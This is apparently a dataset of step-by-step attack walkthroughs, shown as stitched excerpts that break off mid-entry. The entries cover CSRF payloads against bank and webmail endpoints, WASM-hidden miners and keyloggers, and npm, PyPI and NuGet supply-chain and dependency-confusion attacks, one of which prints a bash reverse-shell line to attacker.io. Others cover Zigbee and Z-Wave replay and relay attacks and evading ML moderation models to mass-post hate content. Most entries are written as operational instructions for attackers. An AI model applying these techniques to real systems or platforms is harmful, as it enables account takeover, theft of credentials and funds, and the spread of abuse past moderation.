stylesheet, it sends a GET request to the target server. 3. If that endpoint accepts GET and performs critical actions, the user is unknowingly affected. 4. The CSS may not even be valid and may not render, but the request still reaches the server. 5. This stealth technique bypasses many script-blocking WAFs since it\u2019s pure HTML. 6. GET-based state-changing endpoints are especially vulnerable. 7. Mitigation is straightforward: never allow GET to change data. 8. Monitor requests coming from rel=\"stylesheet\" with sensitive paths.", "1. The attacker embeds a hidden <video> tag on a malicious site like <video src=\"https://site.com/disableUser?id=123\" autoplay muted></video>. 2. When a logged-in user visits, the browser sends a GET request to the target endpoint to load the \u201cvideo.\u201d 3. The server executes the action (e.g., disable account) due to lack of validation. 4. The user sees nothing because the tag is hidden and muted. 5. This allows attacks without JavaScript or visible UI. 6. It abuses the behavior of multimedia tags making GET requests. 7. The attacker can rotate target parameters for batch actions. 8. This technique is effective against legacy endpoints using GET for admin actions.", "1. The attacker embeds an <img> tag with a malicious GET URL in a PDF file. 2. The image points to something like https://store.com/addToCart?item=999. 3. When the PDF is viewed inside the browser (via viewer), the image auto-loads. 4. Since the browser sends the session cookies, the item is added to the user\u2019s cart. 5. The victim may not even notice unless they check the cart manually. 6. The attacker could automate spam orders or inflate cart values. 7. This attack vector is useful in phishing documents sent via email. 8. The trick works because embedded resources in PDFs load like normal HTML in-browser.", "1. The attacker encodes a .wasm binary into a long base64 string. 2. They embed this string directly in the webpage using a data: URI. 3. JavaScript fetches and decodes the string into a binary array. 4. The WASM module is instantiated and executed in memory. 5. There is no external file to download, making it invisible to firewalls or scanners watching for .wasm extensions. 6. Many CSP rules don\u2019t block data URIs, allowing the attack to succeed even on hardened pages. 7. This technique hides malicious modules in plain sight. 8. It is effective against weak CSP and simple scanning tools.", "1. The attacker encodes a URL like https://ecomm.com/cart?add=item123 into a QR code. 2. The QR is shared via poster, email, or WhatsApp as a \u201cdiscount link.\u201d 3. When a logged-in user scans it, their mobile browser opens the link and sends a GET request. 4. The item is added to the cart or order is placed automatically. 5. If the site uses GET for sensitive actions, this triggers silent operations. 6. QR delivery makes CSRF stealthier and harder to detect. 7. The attacker repeats the method across different campaigns. 8. CSRF via QR is rising due to mobile-first browsing habits.", "1. The attacker establishes a persistent WebSocket connection between client and server. 2. Instead of serving a full .wasm file, they break it into small chunks and stream it over the socket. 3. The client reassembles the binary in memory and uses WebAssembly.instantiate() to execute it. 4. Since it bypasses HTTP and file URLs, it's harder to trace in network logs. 5. The script never writes the payload to disk or triggers standard download warnings. 6. The WebSocket server may change its IP or domain frequently to avoid detection. 7. The attacker gains in-memory execution, stealth, and flexibility with this technique. 8. It\u2019s an advanced method of using WASM for live attack delivery.", "1. The attacker finds a vulnerable GET endpoint: https://bank.com/transfer?to=attacker&amount=500. 2. They embed an <img> tag in their own malicious site: <img src=\"https://bank.com/transfer?to=attacker&amount=500\">. 3. When a logged-in user visits the malicious page, the browser automatically loads the image, unknowingly making the GET request. 4. Since the request includes the user\u2019s session cookie, the bank interprets it as a valid transfer. 5. No image will be shown (response isn't a real image), but the action completes. 6. This method requires no JavaScript, making it stealthy and widely compatible. 7. Attackers use forums, ads, or phishing emails to lure users into loading the malicious page. 8. The success depends on the server incorrectly using GET for state-changing actions.", "1. The attacker forks an old but still-used GitHub repo (e.g., js-formater) that hasn\u2019t been updated in years.2. They copy the code and publish it to npm using the same name with a typo or variation (e.g., js-formattar).3. The forked version includes all functions but adds subtle malicious code in utility files.4. Developers searching for the original might install the lookalike, especially if the README and codebase look legit.5. Upon installation, the payload executes and might establish reverse shells or data theft.6. Because the repo looks like a continuation, the trust gap is small.7. The attacker gains entry through neglected but recognizable packages.", "1. The attacker generates a QR code that points to a phishing site hosted with HTTPS. 2. The site mimics a legitimate brand login page. 3. Hidden in the page is a .wasm file that executes upon page load using JavaScript\u2019s fetch() API. 4. This WASM file contains logic to fingerprint the browser and silently load a second-stage payload. 5. The page shows a fake login form while WASM runs in the background. 6. Once the victim enters data, it is exfiltrated while the attacker gains info from the WASM probe. 7. QR-based delivery increases stealth, especially in phishing campaigns using print or physical media. 8. This blends traditional phishing with WASM-based execution.", "1. The attacker hides a compiled .wasm binary inside the pixel data of a .png file. 2. JavaScript code on a web page loads the image via <img> and reads the binary data using Canvas API. 3. It decodes the WASM module from pixel values and passes it to WebAssembly.instantiate(). 4. The payload executes in memory without ever appearing as a standalone file. 5. Since the image looks harmless and is served from a trusted CDN, it bypasses basic detection. 6. The actual script tag on the page is only a few lines long, appearing benign. 7. Once loaded, the WASM module performs fingerprinting or drops other in-memory modules. 8. This demonstrates advanced payload obfuscation leveraging multimedia APIs.", "1. The attacker hosts a WASM module disguised as a utils.min.js on a free CDN. 2. They inject references to this file across multiple small blog sites or ad networks. 3. When users visit any of these sites, the loader fetches and executes the WASM payload. 4. CDN cache ensures fast and global delivery, bypassing many domain-based filters. 5. The JS loader is often only a few lines and doesn\u2019t reveal malicious logic. 6. WASM modules may perform fingerprinting, beaconing, or load stage-2 shellcode. 7. The attacker avoids detection by rotating CDN URLs or updating payloads dynamically. 8. This method takes advantage of the trust in major CDNs and low inspection of static assets.", "1. The attacker hosts a fake tech support forum where users leave tabs open for solutions. 2. When the user shifts to another tab, the site uses visibilitychange and blur to detect inactivity. 3. After 90 seconds, the page is changed into a fake Dropbox login using accurate styling and branding. 4. The victim, thinking they\u2019ve been logged out, types in their Dropbox email and password. 5. Credentials are sent to a malicious server. 6. The attacker then accesses the Dropbox account to download sensitive files. 7. The user is shown a fake \u201cWrong password\u201d alert or redirected to the real Dropbox to reduce suspicion.", "1. The attacker identifies a banking site (bank.com) that allows money transfers via POST requests from authenticated users. 2. They craft a malicious site with a hidden HTML form targeting https://bank.com/transfer. 3. The form contains pre-filled fields (e.g., to=attacker&amount=1000). 4. A short JavaScript snippet (form.submit()) is executed immediately when the page loads. 5. If a logged-in user visits the attacker\u2019s page, the browser automatically sends the request using existing session cookies. 6. The bank processes the transaction without requiring additional user verification. 7. The victim remains unaware as no UI is shown. 8. The attacker repeatedly lures victims via phishing or embedded content to exploit authenticated sessions.", "1. The attacker identifies a company\u2019s private Go package naming convention (e.g., corp-internal-lib/foo).2. They register a similar but subtly misspelled public package name (e.g., corp-internallib/foo) on pkg.go.dev or GitHub.3. A developer mistypes the package name during import, causing the build system to pull from the attacker\u2019s module.4. The malicious module includes pre-build scripts or backdoored logic.5. When the CI/CD pipeline compiles the code, the module runs or installs malware.6. The malware connects to a C2 server or leaks environment secrets to attacker-controlled storage.", "1. The attacker identifies a low-maintenance package used deep in dependency trees (e.g., leftpad-lite).2. They either take control via expired maintainer email or submit a benign PR and later become a contributor.3. Once they publish a new version, it is pulled in transitively by many projects that use higher-level packages.4. Inside the update, they insert a malicious function triggered under specific conditions (e.g., specific env var set).5. Since the package is rarely reviewed directly, the payload hides for long periods.6. When triggered, it executes code like beaconing out secrets or modifying system files.7. The attacker reaches multiple targets indirectly.", "1. The attacker identifies a private scoped npm package used internally (e.g., @corp/utils) through GitHub leaks or internal code shared in forums.2. They publish a public package using the same name, exploiting cases where registries don\u2019t properly isolate scopes.3. The enterprise's CI/CD misconfigures .npmrc to default to the public registry.4. When the pipeline installs dependencies, it unknowingly fetches the attacker\u2019s version.5. A malicious preinstall script exfiltrates CI credentials, environment variables, or IAM tokens from the build runner.6. Attacker uses these to pivot into internal systems.", "1. The attacker identifies a target using a monorepo structure with multiple internal packages.2. They inspect open-source configurations or CI logs to identify internal library names used in package.json.3. They publish a package to npm with an internal-sounding name (e.g., @company/utils-core).4. The internal system lacks proper .npmrc scoping or registry locking, allowing npm to resolve the malicious package from the public registry.5. During CI builds, the malicious package is pulled instead of the private internal one.6. It executes malicious scripts via the postinstall hook.", "1. The attacker identifies a web app that allows users to log in using Google OAuth. 2. The login process involves a popup window where the user authenticates. After successful login, the popup uses window.opener.postMessage() to send the JWT back to the main app. 3. The main app has a message event listener that simply accepts any incoming postMessage and stores the token in localStorage without verifying the message origin. 4. The attacker creates a malicious webpage and embeds the original site using an iframe. 5. Once the user logs in through the legitimate popup, the attacker\u2019s page \u2014 acting as the opener \u2014 also receives the token. 6. This is possible because the app did not verify event.origin and event.source before trusting the message. 7. The attacker uses the stolen JWT to authenticate as the victim and gain full access to their dashboard. 8. The user remains unaware because all activity happened in the background.", "1. The attacker identifies an internal monorepo project that references a private dependency named utils-core. 2. They upload a malicious utils-core package to the public NPM registry with a higher version number. 3. The CI/CD pipeline, misconfigured to allow public registry fallback, downloads the attacker's version. 4. The malicious code executes as part of the build, potentially leaking credentials or modifying output binaries. 5. The attacker receives internal secrets via webhook or DNS exfiltration.", "1. The attacker identifies an internal package used by an organization, such as @org/data-utils.2. They publish a public package with the unscoped name data-utils.3. In environments where the internal registry is misconfigured or unavailable, fallback may occur to the public registry.4. The malicious package has mostly functional logic but includes hidden harmful behavior (e.g., beaconing to external C2).5. During a CI build or dev setup, the public package gets installed.6. On execution, the hidden payload runs, possibly harvesting tokens, SSH keys, or environment data.7. Since the name is familiar, detection may take time.", "1. The attacker identifies internal NuGet package names via leaked .csproj files or internal docs.2. They publish public packages with those names on the public NuGet registry.3. Visual Studio or automated builds attempt to resolve packages and may pull from public registry first.4. If no priority is set for internal feeds, public malicious version is installed.5. The malicious package includes scripts that steal credentials or manipulate MSBuild logic.6. Upon build, the attacker gains access or plants persistent logic in the compiled output.7. This can silently poison releases or local developer builds.", "1. The attacker includes in their page: <link rel=\"prefetch\" href=\"https://target.com/autoRenew?years=5\">. 2. Browsers interpret this as a performance enhancement and prefetch the resource. 3. If the user is authenticated, the browser includes cookies in the background GET request. 4. The target server executes the auto-renew logic, extending the plan or triggering billing. 5. The user sees nothing, and the URL is never shown in the address bar. 6. This uses browser optimization headers for malicious intent. 7. The trick is most effective when sites use GET for operations that should be POST-only. 8. Proper input validation and CSRF tokens prevent such abuses.", "1. The attacker launches a popunder window via JavaScript triggered by user interaction. 2. The popunder tab opens an innocent page but then navigates silently to a CSRF payload page. 3. The new page contains an auto-submitting form targeting https://target.com/profile/delete. 4. Since it's in a background tab, the user doesn't notice anything. 5. The form runs form.submit() and sends session cookies. 6. The action is completed without visual clue. 7. This method chains interaction with stealth execution. 8. Often used in adult or pirated content sites to bypass attention.", "1. The attacker lures a user into visiting a page that sets a specific localStorage key like sessionToken=XYZ. 2. Then they redirect the user to another tab or site that loads a script reading from localStorage to authenticate a request. 3. If the target site reuses localStorage keys insecurely, it treats the user as authenticated. 4. The attacker can now trigger requests using the forged token. 5. This attack works especially well in Single Page Applications that trust stored session data. 6. No cookies are required\u2014just stored values. 7. The exploit is silent and doesn\u2019t require a reload. 8. It bridges trust between domains via shared storage misuse.", "1. The attacker modifies a popular image gallery plugin to include a .wasm module. 2. This WASM code is called during fancy slide transitions or when rendering large image grids. 3. The WASM memory buffer grows during each image load and release cycle. 4. Hidden inside is logic to allocate memory with crafted patterns (heap spray). 5. Over time, the heap becomes shaped for potential memory corruption attacks. 6. The plugin works flawlessly, keeping the user unaware. 7. This turns a UI enhancement into a potential memory exploit vehicle. 8. It showcases how visual plugins can be weaponized silently.", "1. The attacker publishes a genuinely useful open-source package, e.g., util-enhancer, to a public registry like npm. 2. The code is clean, performs helpful tasks, and builds credibility by gathering stars and downloads.3. Developers and CI/CD pipelines begin using it, often allowing updates via version ranges like ^1.0.0.4. After a few weeks, the attacker silently updates to version 1.0.1, introducing obfuscated malicious code.5. The malicious code may read system info or tokens and exfiltrate via DNS or HTTP.6. Since the update appears minor, it's pulled automatically into many systems.7. The attacker gains broad access across projects using the trusted package.", "1. The attacker publishes a package called colors-ui-lite, mimicking legitimate color console libraries. 2. Inside the postinstall script in package.json, they insert logic that appends a line to ~/.bashrc, such as bash -i >& /dev/tcp/attacker.io/5555 0>&1. 3. This reverse shell is triggered every time the user opens a new terminal session. 4. The attacker maintains persistent shell access, without relying on an active process or binary. 5. Any time the machine reboots or new sessions start, the backdoor reactivates, providing long-term control. 6. The attack remains hidden unless the victim inspects their bash startup configuration.", "1. The attacker publishes a package like color-helper that includes a hidden preinstall script. 2. This script downloads and executes a Node.js payload from the attacker\u2019s server. 3. Developer unknowingly installs it as a sub-dependency. 4. During install, the payload executes, creating a reverse shell. 5. This happens before any runtime, so even unused packages trigger the compromise. 6. Attacker gets shell access and uses it for privilege escalation within the CI container.", "1. The attacker publishes an NPM package named aws-helper-utils, which mimics naming patterns of legit internal libraries. 2. Inside the postinstall script, a Node.js script is triggered that reads environment variables like AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY. 3. The script base64-encodes these credentials and sends them via HTTPS POST to a malicious server. 4. A target project\u2019s CI pipeline includes this library during automated builds. 5. During pipeline execution, the malicious script runs and successfully exfiltrates live credentials. 6.

The attacker registers malicious.com and points its DNS A record to an external server. 2. After initial victim visit, the attacker changes the DNS to resolve to 127.0.0.1. 3. JS running in the victim\u2019s browser on malicious.com can now access http://127.0.0.1:8080 (e.g., local admin panel). 4. It sends a fetch request to http://127.0.0.1:8080/resetAll. 5. The victim\u2019s browser treats the request as same-origin since the hostname hasn\u2019t changed. 6. The internal app executes the destructive action using default trust. 7. DNS rebinding bypasses origin policies using dynamic IP resolution. 8. This vector enables CSRF-like actions against internal services.", "1. The attacker releases a free UI skin library for a popular browser-based game. 2. The skin loader includes a .wasm file claimed to contain rendering logic. 3. In reality, the WASM module contains a crypto miner that begins execution during UI load. 4. Players assume lag or performance drops are due to skins being graphically intense. 5. The mining continues in the background as long as the player uses the skin. 6. Thousands of players can unknowingly contribute CPU cycles to mining. 7. This scenario abuses user trust in mods and UI enhancements. 8. WASM\u2019s performance makes it ideal for long-running tasks like mining in game mods.", "1. The attacker searches for typos in high-usage packages like numpy, requests, pandas.2. They publish malicious packages with typo'd names such as requessts to PyPI with backdoor code.3. A developer\u2019s Dockerfile includes pip install requessts, unknowingly pulling in the attacker\u2019s package.4. On container build, the package installs and executes code that collects environment secrets or sets up a reverse shell.5. The attacker gets access to container internals, including cloud API tokens and service credentials.6. This can propagate if the container is used in staging or production CI/CD pipelines.", "1. The attacker sets up a webpage with a hidden iframe using <iframe sandbox srcdoc=\"<form action='https://site.com/deleteAccount' method='POST'><input name='confirm' value='yes'></form><script>document.forms[0].submit()</script>\">. 2. The srcdoc attribute directly injects HTML into the iframe. 3. Although sandboxed, browsers allow certain inline scripts to run. 4. This causes auto-submission of the form from within the iframe. 5. If the victim is logged in, session cookies are sent. 6. The deletion action is processed silently. 7. It bypasses some X-Frame protections due to the inline sandboxed nature. 8. Advanced CSRF vectors like this demonstrate how HTML5 features can introduce risk.", "1. The attacker stores a .wasm miner as a base64 GZIP-encoded blob in a JavaScript variable. 2. On page load, the script decompresses it using a client-side decompression library. 3. The decompressed WASM is passed directly into the WebAssembly.instantiate() API. 4. This allows malware to run entirely in memory, without ever touching disk or triggering network fetches. 5. Compression reduces file size and also prevents signature scanning. 6. CPU usage is throttled to avoid drawing attention. 7. The miner auto-starts after a delay to bypass behavior analytics. 8. This is a stealthy form of in-memory crypto exploitation.", "1. The attacker takes a compiled .wasm file and manually edits the binary header and section names using a hex editor. 2. Instead of typical section tags (like \u201ccode\u201d or \u201cdata\u201d), custom non-standard markers are inserted. 3. The payload is still valid and executable by modern browsers but becomes unreadable to common scanners and static analysis tools. 4. Obfuscated WASM code is then hosted on a web page and loaded with a minimal JS stub. 5. When the user visits the page, the WASM executes malicious logic (e.g., tracking, beaconing). 6. Because section names are modified, automated detection tools fail to parse and analyze the binary. 7. This technique enhances stealth in long-running campaigns. 8. It\u2019s effective in environments where WASM analysis relies on known binary layouts.", "1. The attacker targets a vulnerability in a JavaScript engine (e.g., V8) known to mishandle certain memory layouts. 2. They write a script that allocates a large WebAssembly linear memory buffer (e.g., 16MB). 3. This memory is filled with repeating patterns designed to overwrite adjacent objects or confuse the browser\u2019s JIT compiler. 4. Through carefully placed markers, they hope to trigger memory corruption or control flow hijacking. 5. If successful, this can lead to arbitrary code execution in the browser context. 6. Although experimental and not always successful, this technique is being actively researched. 7. Such heap sprays using WASM can evade some mitigations applied to JavaScript-based attacks. 8. The payload stays under the radar due to WASM\u2019s binary nature.", "1. The attacker targets a vulnerable webmail app that exposes /api/delete-email?id=123 and uses cookies for auth. 2. On their malicious site, they embed JavaScript like fetch(\"https://webmail.com/api/delete-email?id=123\", {method: \"GET\", credentials: \"include\"}). 3. If a logged-in user visits the attacker\u2019s site, this script runs automatically. 4. The browser includes authentication cookies while making the request. 5. The server processes the delete request, thinking it's a legit user action. 6. No CORS errors occur because the attacker does not try to read the response, only send the request. 7. This causes destructive behavior without requiring user interaction. 8. Attackers exploit endpoints that trust cookie-based sessions and lack origin validation.", "1. The attacker targets an online banking app that has an endpoint /api/account/summary which returns user\u2019s bank balance and recent transactions. 2. The backend API is configured to allow all origins by using Access-Control-Allow-Origin: * and also sets Access-Control-Allow-Credentials: true. 3. The attacker lures logged-in banking users to visit a malicious site (e.g., fake finance blog). 4. JavaScript on the attacker's page sends a fetch() request to the bank's API endpoint from the victim\u2019s browser. 5. Because the user is logged in and CORS is misconfigured, the browser sends the session cookie along with the request. 6. The API responds with sensitive account information directly into the attacker's page context. 7. The attacker collects and forwards this data to their own server, gaining insight into financial activity. 8. The user sees no warnings, popups, or errors, making this a silent and dangerous exfiltration technique.", "1. The attacker uploads a useful extension with clean code and minor functionality. 2. It gains 1000s of users and earns positive reviews. 3. Later, the attacker pushes an auto-update through the extension\u2019s update_url in the manifest. 4. The new version adds malicious behavior like DOM spying, credential logging, and ad injection. 5. Users\u2019 browsers update silently, since extension updates are auto-applied in the background. 6. New code injects scripts into banking and shopping sites to extract credentials and payment data. 7. Victims are unaware as UI behavior remains similar to the earlier version. 8. The attacker now owns a trusted spyware platform.", "1. The attacker uploads a \u201cBookmark Manager Enhancer\u201d extension that requests access to bookmarks API. 2. Once installed, the extension crawls the user\u2019s bookmarks tree using chrome.bookmarks.getTree(). 3. It identifies patterns in saved links \u2014 such as banking sites, healthcare portals, or internal company dashboards. 4. These links reveal personal interests, services used, and professional affiliations. 5. The data is sent to the attacker\u2019s server and analyzed to build a social engineering profile. 6. The attacker uses this information for targeted phishing, credential stuffing, or business email compromise (BEC). 7. The user is unaware, as no active behavior or UI changes are made by the extension.", "1. The attacker uploads an SVG image with an embedded <image> tag: <image xlink:href=\"https://secure.site.com/logOutUser\" height=\"0\" width=\"0\"/>. 2. When the image is rendered (e.g., in a profile page), the browser automatically sends the request. 3. Since SVG is parsed as XML and rendered like HTML, GET requests to remote servers execute silently. 4. The logout or delete action completes if no protection is in place. 5. SVGs can be delivered via email, chat apps, or file upload features. 6. They often evade WAF filters since they're not traditional HTML. 7. Even some antivirus tools treat SVGs as safe media. 8. This makes SVG a stealthy CSRF delivery vector.", "1. The attacker writes a WASM module that rapidly calls memory.grow() while simultaneously accessing unaligned memory. 2. JS code races the execution between different threads (using Web Workers) to create desynchronized memory states. 3. This leads to use-after-grow conditions where a memory segment is assumed valid but has been altered. 4. The corrupted memory state allows heap spraying patterns to take effect in unpredictable ways. 5. Exploit developers use this for experimental fuzzing and sandbox escape attempts. 6. The race condition depends on browser architecture and CPU thread handling. 7. Advanced attackers test this in isolated VMs to tune exploit conditions. 8. It represents a modern adaptation of memory corruption in WebAssembly.", "1. The attacker writes a WASM-based crypto miner and wraps it inside multiple Web Worker threads. 2. When the page loads, each worker initializes the WASM module independently. 3. This allows CPU-bound operations to run in parallel, maximizing mining output. 4. The mining begins automatically, hidden behind a website offering streaming or tools. 5. To evade detection, the script limits CPU usage to 50% and pauses during user interaction. 6. Dev tools show threads but users may not notice the pattern unless CPU usage is analyzed. 7. The attacker receives earnings through their mining pool account. 8. This method improves efficiency and stealth using standard browser features.", "1. The attacker writes a crypto miner compiled to WebAssembly (e.g., using XMRig with Emscripten). 2. They embed the script on a malicious blog or fake news site. 3. The script waits for the user to interact\u2014specifically, for a scroll event. 4. Once triggered, the miner starts in the background using WebAssembly, avoiding CPU spikes during page load. 5. The script uses Web Workers to distribute the mining task across threads and caps CPU usage to remain stealthy. 6. Users are unaware as the site appears static and trustworthy. 7. The longer the user stays on the page, the more cryptocurrency is mined for the attacker. 8. This attack cleverly ties miner activity to natural user behavior.", "1. The attacker writes a keylogger in C or Rust and compiles it to WASM. 2. This WASM module listens for keystroke events passed from JS. 3. The attacker embeds this in a malicious login page (e.g., fake bank site). 4. JS captures keypresses and forwards them to the WASM function, which encodes and buffers the data. 5. At intervals, the WASM module sends the keystroke logs to an attacker-controlled server. 6. All logic is hidden in .wasm, making static analysis of JS useless. 7. The site appears clean in most scanners, but credentials are being exfiltrated. 8. This demonstrates WASM\u2019s use in real-time data theft.", "1. The attacker writes a malicious C program and compiles it into WebAssembly. 2. During compilation, they introduce multiple function pointers and use indirect function calls via tables. 3. This structure obscures the control flow and hides which function is actually executed at runtime. 4. The attacker ensures that the actual malicious logic is split across multiple small functions. 5. These are randomly called via a large table that appears like legitimate dispatch logic. 6. The JS glue code simply calls a single \u201cmain\u201d function without revealing complexity. 7. Static analysis tools struggle to trace the call path through the table. 8. This technique is widely used to hide payloads from automated scanners or analysts.", "1. The attacker writes a malicious function in C containing shellcode logic. 2. They compile it to WASM using LLVM with control flow flattening (CFF) enabled. 3. This transforms the function into a state machine with many branches and opaque switch statements. 4. Static tools cannot easily trace logic paths due to removed structure. 5. The flattened .wasm is loaded using a small JS wrapper, which calls obfuscated entry points. 6. The real payload is triggered only when multiple conditions are met (e.g., time-based logic). 7. This confuses reverse engineers and bypasses simple sandbox automation. 8. The method is commonly used in malware hiding inside compiled executables, now applied in WASM.", "1. The attacker writes a malicious payload in C/C++ and compiles it into WASM. 2. They host it on a fake website posing as a free tool. 3. A JavaScript snippet uses the Intl API and time zone heuristics to determine the user\u2019s location. 4. Only if the user appears to be from a specific country (e.g., U.S. or Europe), the site loads and executes the .wasm file. 5. This prevents sandboxes and honeypots (usually from other regions) from detecting the payload. 6. The WASM module performs in-memory tasks such as beaconing, fingerprinting, or running shellcode. 7. Since the check is done client-side and no network requests reveal intent unless triggered, it's hard to catch. 8. This selective execution tactic enhances evasion and targeting.", "1. The attacker writes a payload in C that performs some malicious logic (e.g., download & exec, shell). 2. This code is compiled into WASM and hosted on a website. 3. A user visits the site, and JS loads the .wasm module into browser memory. 4. The code runs entirely in memory \u2014 nothing is downloaded or written to disk. 5. This avoids triggering file-based antivirus scanners. 6. Once executed, the WASM can create hidden DOM elements or backdoor browser storage. 7. When the page is closed, traces are minimal. 8. This tactic is ideal for temporary, stealthy attacks.", "1. The attacker writes a simple malware payload in C or Rust that includes beaconing and fileless execution logic. 2. They compile this code to WebAssembly using tools like Emscripten or Rust\u2019s wasm32 target. 3. The resulting .wasm file contains the main malicious logic in a binary format that can\u2019t be analyzed easily with plain text search. 4. A small JavaScript stub is written to load and instantiate the WASM module inside a web page. 5. The stub hides behind a legitimate-looking app like a file converter or speed test. 6. When a user opens the site, the WASM module executes, and malicious behavior begins (e.g., communicating with a command-and-control server or dropping in-memory shellcode). 7. Antivirus and static detection tools scanning the HTML and JavaScript do not flag the .wasm code because it is opaque. 8.

These models take continuous input features (e.g., sensor values, pixel intensities, financial indicators). Step 2: Obtain or reverse-engineer the input format.

For example, a fraud detection model may use the \u201clocation\u201d field where \u201cUS\u201d means the United States. Step 2: Understand how the model interprets this feature \u2014 e.g., is it using a categorical encoder, one-hot encoding, or text mapping? What are the expected values (like \u201cUS\u201d, \u201cCA\u201d, \u201cUK\u201d) and what labels do they carry in the model? Step 3: Begin altering the semantic representation of the feature outside the model \u2014 i.e., change how the data is reported or injected. Example: Instead of \u201cUS,\u201d use \u201cNorth America\u201d or GPS coordinates, or \u201cUSA-1.\u201d The model trained on \u201cUS\u201d may now misinterpret or ignore the location feature. Step 4: If the system accepts flexible formats (e.g., strings, API metadata, web forms), test different semantic values for the same real-world meaning. Step 5: Use this to manipulate classification \u2014 e.g., make high-risk locations appear safe, or make one group of users invisible to geofencing or regulation-based filters. Step 6: Continue feeding these semantically-shifted values to cause concept drift. The model will now perform poorly because it sees distributional change but can\u2019t link it back to the original meaning. Step 7: If retraining happens, the model may learn incorrect mappings (e.g., mapping \u201cNA\u201d \u2192 safe), which the attacker can exploit to bypass policies or manipulate results. Step 8: Scale this attack across accounts or inputs to poison the model over time while remaining undetected, since the inputs are not technically wrong \u2014 only semantically redefined.", "Step 1: Identify a machine learning model that relies on static or rarely updated training data. For example, a hate speech detection model in a content platform that was trained a year ago and is not frequently retrained. Step 2: Observe what kind of language, vocabulary, and sentence patterns the model flags. You can do this by submitting variations of content and noting which ones are removed, flagged, or accepted. Step 3: Research new slang, trending obfuscation techniques, or alternate spellings commonly used to avoid content moderation. Examples include replacing offensive words with symbols (e.g., \u201ch@te\u201d), intentional misspellings (e.g., \u201cr@cist\u201d), or using meme formats and coded language (e.g., \u201cskkkrrr nation\u201d as a stand-in for racist terms). Step 4: Begin crafting messages or content that use these new forms and submit them to the platform. If the model is not updated to recognize these terms, the inputs will pass through undetected. Step 5: Monitor responses \u2014 if the content is accepted and not flagged, the model is indeed blind to these inputs due to drift (i.e., it hasn\u2019t seen this style during training). Step 6: Continue refining your evasion techniques by staying current with evolving slang, subculture terms, or visual/emoji-based obfuscation (e.g., hiding toxic words in image memes or using Unicode characters that look similar). Step 7: Leverage the blind spot by repeatedly posting harmful, spammy, or misleading content using these new encodings. Since the model doesn\u2019t adapt, it won\u2019t catch the patterns, resulting in large-scale evasion. Step 8: Use automation or bots to scale this evasion campaign. Even if some content is caught, most will bypass detection because the blind spot remains until model retraining occurs. Step 9: For high-impact attacks, combine this with multiple accounts and slowly escalate toxicity over time, staying below moderation thresholds. This form of attack is silent and long-lasting.", "Step 1: Identify a model that is audited or regulated using explainability techniques like SHAP, LIME, or Integrated Gradients. These models output feature importance per prediction. For example, in a sentiment analysis model, SHAP might highlight \u201cbad,\u201d \u201cexcellent,\u201d or \u201ccheap\u201d as dominant sentiment drivers. Step 2: Prepare inputs where you control the dominant features. Slowly start replacing high-importance features (like \u201cexcellent\u201d) with synonyms or neutral terms (like \u201cnice\u201d or \u201cokay\u201d) that shift the feature weight. Step 3: Submit these altered inputs repeatedly to the model, ensuring they still return the desired label (e.g., positive review). Step 4: Observe how the explainability model updates \u2014 it will now treat \u201cokay\u201d or \u201calright\u201d as more important, even though they are semantically weaker. Step 5: Continue this process across large batches to push the model to drift its understanding of feature importance. Step 6: Eventually, the SHAP or LIME visualization becomes misleading, showing low-quality features as top drivers. This misleads security teams or auditors who rely on model introspection. Step 7: The attacker can now inject malicious content that is misclassified and not explainably flagged. Step 8: This attack targets trust in model transparency and is especially effective in environments requiring explainability (e.g., legal, banking, hiring AI).", "Step 1: Identify a multi-register block (e.g., pressure data across 40010\u201340012).Step 2: Spoof only 40010 with incorrect value.Step 3: Logic engine attempts math operations across invalid/incomplete dataset.Step 4: Calculation fails or outputs error.Step 5: HMI shows invalid value or drops to fail-safe.Step 6: Operator confused by false fault.", "Step 1: Identify a platform that relies on machine learning-based content moderation, such as social media sites or video platforms. These platforms use AI to detect hate speech, violence, or misinformation in both text and images. Step 2: Research the type of inputs and rules the model is likely trained on \u2014 such as known hate phrases, specific visual symbols (e.g., swastikas, guns), or flagged memes. These patterns are often available from past bans or public moderation policies. Step 3: Analyze current trending meme formats, image filters, font changes, and slang that are not yet recognized by the platform\u2019s moderation model. For example, using distorted text, cartoon overlays, deep-fried images, or meme slang (\u201cskrrt\u201d, \u201cglowie\u201d, \u201cBoogaloo\u201d). Step 4: Begin crafting harmful content that includes the same harmful message but obfuscated in new styles. Example: embed hate speech inside a stylized meme using distorted fonts, inverted colors, and new slang. Or use text in the image that looks like \u201cr@cist\u201d instead of \u201cracist.\u201d Step 5: Upload this new meme format to the platform. Since the ML model was trained on older formats and phrases, it may fail to detect the content as harmful. Step 6: Monitor how the content performs \u2014 if it\u2019s not flagged or removed, the model likely has a drift blind spot. Step 7: Scale this evasion using automation or bot accounts, flooding the platform with disguised harmful content that passes moderation. Step 8: Adjust meme formats and slang frequently to stay ahead of the model\u2019s detection logic. This ensures persistent evasion using drift.", "Step 1: Identify a routing node in the mesh (e.g., Z-Wave range extender or smart plug).Step 2: Reset the routing node and prepare to re-pair it using attacker\u2019s S0-only controller.Step 3: Start PC Controller and advertise only S0 during pairing.Step 4: The routing device accepts S0 and sends key in the clear.Step 5: Use the Z-Wave mesh mapping tool to view the route changes after re-integration.Step 6: Observe that Z-Wave messages from other devices are now relayed through the rogue-controlled node.Step 7: Use this access to log or modify relayed commands (like door locks or motion alerts).Step 8: Demonstrate man-in-the-middle data tampering in a simulated mesh environment.Step 9: Show how a single compromised node affects the entire mesh.Step 10: Discuss how mesh topology awareness is critical in IoT security.", "Step 1: Identify a smart device (lock, sensor) using Zigbee and supporting quantum-encrypted messaging.Step 2: Use Zigbee sniffer to capture legitimate QSM key authentication.Step 3: Deploy two Zigbee dongles\u2014one near the controller, one near the target device.Step 4: Relay signals with minimal latency to impersonate the controller.Step 5: Unlock or manipulate the device without breaking encryption.", "Step 1: Identify a smart sprinkler system that uses Zigbee.Step 2: Use Zigbee2MQTT or a sniffer (like Wireshark with a Zigbee plugin) to capture network traffic while a legitimate user activates the sprinkler.Step 3: Filter out the activation packet from the PCAP log and extract the frame containing the ON command.Step 4: Save this command and test the replay capability using HackRF and a Python-based transmission script.Step 5: Replay the command late at night or early morning.Step 6: Sprinklers activate without any user action, wasting water.Step 7: Repeat across multiple days to create operational confusion.", "Step 1: Identify a system protected by a machine learning-based Intrusion Detection System (IDS), anomaly detection engine, or fraud detection platform. These systems are designed to detect unusual behavior in real-time by comparing incoming traffic or events against a learned model of \"normal\" behavior. Step 2: Understand the system\u2019s sensitivity to novel data. Most ML-based IDS models are trained on historical data and will flag traffic patterns that are statistically different from what they've seen. Step 3: Craft a large number of synthetic network events or 